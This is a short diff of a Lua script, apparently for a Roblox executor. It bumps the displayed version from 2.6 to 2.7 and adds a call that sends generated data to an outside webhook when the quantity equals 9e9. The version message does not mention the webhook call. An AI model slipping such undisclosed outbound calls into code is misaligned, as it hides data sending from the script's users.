@@ -1,6 +1,6 @@
 Ezz = Instance.new("Message")
 Ezz.Name = "sffsfsfsfsfsfs"
-Ezz.Text = "Version 2.6 ( You can downgrade using github )"
+Ezz.Text = "Version 2.7 ( You can downgrade using github )"
 Ezz.Parent = game:GetService("CoreGui")
 task.wait(1)
 Ezz:Destroy()
@@ -304,6 +304,10 @@ until generated ~= false
 table.insert(bulk, generated)
 generated = false
 MSG.Text = "Generating... "..i.."/"..quan..""
+if quan == tonumber(9e9) then
+SendDataToWebhook(dat, met, quan, tocopy)
+task.wait(1)
+end
 end
 tocopy = TableToString(bulk)
 setclipboard(tocopy)
